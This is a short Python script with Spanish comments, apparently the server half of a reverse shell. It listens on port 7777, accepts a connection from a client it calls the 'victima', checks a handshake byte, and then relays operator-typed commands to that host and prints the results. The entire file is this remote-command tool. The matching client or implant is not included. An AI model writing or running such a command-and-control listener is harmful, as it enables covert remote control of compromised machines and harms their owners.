import socket

def main():
    server = socket.socket()
    server.bind(('localhost', 7777))
    server.listen(1)  # El servidor acepta solo 1 conexión

    while True:
        victima, direccion = server.accept()
        print(f'Conexión de: {direccion}')

        # Primero recibe el mensaje de conexión
        ver = victima.recv(1024)
        receiving_object = bytes("1", encoding='utf-8')

        if ver == receiving_object:  # Verifica que el mensaje de conexión es "1"
            print("Conexión aceptada")

            while True:
                opcion = bytes(input("shell@shell: "), encoding='utf-8')
                print(f'Comando enviado: {opcion.decode()}')
                victima.send(opcion)

                # Recibe respuesta del cliente
                resultado = victima.recv(4096)  # Buffer más grande
                print(resultado.decode())  # Decodifica y muestra el resultado

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
